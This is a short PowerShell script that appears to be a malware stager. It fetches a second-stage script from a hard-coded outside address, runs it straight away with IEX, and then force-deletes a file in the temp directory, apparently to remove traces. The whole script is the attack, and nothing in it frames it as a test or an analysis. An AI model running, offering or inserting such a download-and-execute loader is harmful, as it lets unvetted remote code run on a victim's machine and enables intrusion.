
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://192.0.2.21/stage2.ps1',
    [int]$TimeoutSec = 150
)
IEX (Invoke-WebRequest -Uri $Stage2Url -UseBasicParsing).Content
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
